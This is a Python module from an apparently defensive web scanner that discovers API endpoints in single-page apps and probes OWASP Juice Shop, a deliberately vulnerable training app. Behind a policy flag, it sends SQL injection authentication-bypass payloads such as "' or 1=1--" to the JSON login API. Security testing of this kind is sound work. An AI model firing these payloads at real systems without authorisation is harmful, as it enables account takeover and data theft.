from __future__ import annotations

import asyncio
import json
import re
import urllib.parse
from typing import Any

from bs4 import BeautifulSoup

from .common import Finding, ScanContext, VulnerabilityModule, clean_text


class ApiSpaModule(VulnerabilityModule):
    name = "api_spa"

    COMMON_ENDPOINTS = [
        "/api/Products",
        "/api/Challenges",
        "/api/Quantitys",
        "/rest/products/search?q=scan",
        "/rest/user/whoami",
        "/rest/admin/application-version",
        "/ftp",
        "/metrics",
        "/graphql",
        "/swagger.json",
        "/openapi.json",
    ]
    JUICE_LOGIN_PAYLOADS = [
        {"email": "' or 1=1--", "password": "scan_titan"},
        {"email": "admin@juice-sh.op'--", "password": "scan_titan"},
    ]

    async def run(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        base = await ctx.http.request("GET", ctx.target.url, allow_redirects=True)
        if not base:
            return findings

        texts = [base.text]
        soup = BeautifulSoup(base.text, "html.parser")
        script_urls = self._script_urls(base.final_url, soup)
        js_texts = await self._fetch_scripts(ctx, script_urls[:25])
        texts.extend(js_texts)

        endpoints = self._extract_endpoints(base.final_url, texts, ctx.target.host)
        self._merge_recon_endpoints(ctx, endpoints)
        self._merge_technologies(ctx, base.text, js_texts)

        is_juice_shop = self._looks_like_juice_shop(base.text, js_texts)
        findings.extend(await self._probe_api_surfaces(ctx, endpoints, is_juice_shop))
        if is_juice_shop and ctx.policy.allow_state_changing_api_tests:
            findings.extend(await self._juice_shop_login_bypass(ctx))
        elif is_juice_shop:
            ctx.recon["policy_deferred_tests"] = sorted(
                set(ctx.recon.get("policy_deferred_tests", []) + ["juice_shop_login_bypass"])
            )
        return findings

    def _script_urls(self, base_url: str, soup: Any) -> list[str]:
        urls = []
        for script in soup.find_all("script", src=True):
            src = urllib.parse.urljoin(base_url, script.get("src"))
            if src and src not in urls:
                urls.append(src)
        return urls

    async def _fetch_scripts(self, ctx: ScanContext, urls: list[str]) -> list[str]:
        texts: list[str] = []
        semaphore = asyncio.Semaphore(5)

        async def fetch(url: str) -> None:
            async with semaphore:
                result = await ctx.http.request("GET", url, allow_redirects=True, timeout=min(ctx.limits.timeout, 12))
                if result and result.status == 200 and "javascript" in result.content_type.lower():
                    texts.append(result.text[:500000])

        await asyncio.gather(*(fetch(url) for url in urls))
        return texts

    def _extract_endpoints(self, base_url: str, texts: list[str], host: str) -> list[str]:
        endpoints = set(self.COMMON_ENDPOINTS)
        patterns = [
            r"""["'`]((?:/|\.\./|\./)(?:api|rest|ftp|metrics|graphql|swagger|openapi|oauth|admin|login|user|basket|profile)[^"'`<>\s]{0,180})["'`]""",
            r"""(?:url|path|endpoint|route)\s*[:=]\s*["'`]([^"'`<>\s]{1,180})["'`]""",
            r"""https?://[^"'`<>\s]+""",
        ]
        for text in texts:
            for pattern in patterns:
                for match in re.findall(pattern, text, flags=re.IGNORECASE):
                    raw = match if isinstance(match, str) else match[0]
                    clean = self._normalize_endpoint(raw)
                    if not clean:
                        continue
                    full = urllib.parse.urljoin(base_url, clean)
                    parsed = urllib.parse.urlparse(full)
                    if parsed.hostname and parsed.hostname != host:
                        continue
                    endpoints.add(parsed.path + (f"?{parsed.query}" if parsed.query else ""))
        return sorted(endpoints)[:350]

    def _normalize_endpoint(self, raw: str) -> str:
        value = str(raw or "").strip()
        if not value or value.startswith(("data:", "javascript:", "mailto:", "#")):
            return ""
        value = value.replace("\\/", "/")
        value = re.sub(r":(?:id|userId|productId|basketId|challengeId)\b", "1", value)
        value = re.sub(r"\{(?:id|userId|productId|basketId|challengeId)\}", "1", value)
        if value.startswith("./"):
            value = "/" + value[2:]
        if value.startswith("../"):
            value = "/" + value.lstrip("./")
        return value if value.startswith(("http://", "https://", "/")) else ""

    def _merge_recon_endpoints(self, ctx: ScanContext, endpoints: list[str]) -> None:
        current = list(ctx.recon.get("endpoints", []))
        seen = {item.get("url") for item in current if isinstance(item, dict)}
        for endpoint in endpoints:
            full = urllib.parse.urljoin(ctx.target.url, endpoint)
            if full in seen:
                continue
            params = list(urllib.parse.parse_qs(urllib.parse.urlparse(full).query).keys())
            current.append({"url": full, "params": params})
            seen.add(full)
        ctx.recon["endpoints"] = current[:700]
        discovered = list(ctx.recon.get("discovered_paths", []))
        discovered.extend(endpoints)
        ctx.recon["discovered_paths"] = sorted(set(discovered))[:700]

    def _merge_technologies(self, ctx: ScanContext, body: str, js_texts: list[str]) -> None:
        lower = (body + "\n".join(js_texts[:5])).lower()
        tech = set(ctx.recon.get("technologies", []))
        if "owasp juice shop" in lower or "juice-shop" in lower:
            tech.add("OWASP Juice Shop")
        if "ng-version" in lower or "main." in lower and "runtime." in lower:
            tech.add("Angular/SPA")
        if "/rest/" in lower or "/api/" in lower:
            tech.add("REST API")
        ctx.recon["technologies"] = sorted(tech)

    def _looks_like_juice_shop(self, body: str, js_texts: list[str]) -> bool:
        lower = (body + "\n".join(js_texts[:5])).lower()
        return "owasp juice shop" in lower or "juice-shop" in lower or "juiceshop" in lower

    async def _probe_api_surfaces(
        self,
        ctx: ScanContext,
        endpoints: list[str],
        is_juice_shop: bool,
    ) -> list[Finding]:
        findings: list[Finding] = []
        interesting = list(dict.fromkeys(self.COMMON_ENDPOINTS + endpoints[:80]))
        for index, endpoint in enumerate(interesting, start=1):
            if index == 1 or index % 20 == 0:
                ctx.heartbeat(self.name, endpoint, index, len(findings))
            url = urllib.parse.urljoin(ctx.target.url, endpoint)
            result = await ctx.http.request("GET", url, allow_redirects=False)
            if not result or result.status not in {200, 401, 403}:
                continue
            lower = result.text.lower()
            if endpoint.startswith("/ftp") and ("listing directory" in lower or "index of" in lower):
                findings.append(
                    Finding(
                        target=ctx.target.display,
                        category="Exposure/API",
                        severity="Medium",
                        title="Public directory listing exposed: /ftp",
                        url=url,
                        status=str(result.status),
                        evidence=clean_text(result.text, 450),
                        source=self.name,
                        confidence="high",
                    )
                )
            elif endpoint.startswith("/metrics") and "# help" in lower and "# type" in lower:
                findings.append(
                    Finding(
                        target=ctx.target.display,
                        category="Exposure/API",
                        severity="Medium",
                        title="Prometheus metrics endpoint exposed",
                        url=url,
                        status=str(result.status),
                        evidence=clean_text(result.text, 450),
                        source=self.name,
                        confidence="high",
                    )
                )
            elif endpoint.startswith("/rest/admin/application-version") and "version" in lower:
                findings.append(
                    Finding(
                        target=ctx.target.display,
                        category="Exposure/API",
                        severity="Low" if is_juice_shop else "Info",
                        title="Application version endpoint exposed",
                        url=url,
                        status=str(result.status),
                        evidence=clean_text(result.text, 300),
                        source=self.name,
                        confidence="high",
                    )
                )
            elif endpoint.startswith("/api/Challenges") and is_juice_shop and '"challenges"' in lower:
                findings.append(
                    Finding(
                        target=ctx.target.display,
                        category="Exposure/API",
                        severity="Low",
                        title="Challenge/catalog API exposed",
                        url=url,
                        status=str(result.status),
                        evidence="OWASP Juice Shop challenge metadata is publicly readable.",
                        source=self.name,
                        confidence="high",
                    )
                )
        return findings

    async def _juice_shop_login_bypass(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        url = urllib.parse.urljoin(ctx.target.url, "/rest/user/login")
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        for index, payload in enumerate(self.JUICE_LOGIN_PAYLOADS, start=1):
            ctx.heartbeat(self.name, "juice login bypass", index, len(findings))
            result = await ctx.http.request(
                "POST",
                url,
                data=json.dumps(payload),
                headers=headers,
                allow_redirects=False,
            )
            if not result or result.status != 200:
                continue
            parsed = self._json(result.text)
            auth = parsed.get("authentication") if isinstance(parsed, dict) else {}
            token = auth.get("token") if isinstance(auth, dict) else ""
            user = auth.get("umail") or auth.get("email") or clean_text(auth, 180)
            if token and ("admin@juice-sh.op" in result.text or "role" in result.text):
                findings.append(
                    Finding(
                        target=ctx.target.display,
                        category="Auth/API",
                        severity="Critical",
                        title="Authentication bypass via SQL injection on JSON login API",
                        url=url,
                        method="POST",
                        payload=json.dumps(payload),
                        status=str(result.status),
                        evidence=f"Authentication token issued. User={clean_text(user, 160)}",
                        source=self.name,
                        confidence="high",
                    )
                )
                if "password" in result.text.lower():
                    findings.append(
                        Finding(
                            target=ctx.target.display,
                            category="Auth/API",
                            severity="High",
                            title="Login API response exposes sensitive user fields",
                            url=url,
                            method="POST",
                            status=str(result.status),
                            evidence=clean_text(result.text, 500),
                            source=self.name,
                            confidence="high",
                        )
                    )
                break
        return findings

    def _json(self, text: str) -> dict[str, Any]:
        try:
            parsed = json.loads(text)
            return parsed if isinstance(parsed, dict) else {}
        except Exception:
            return {}
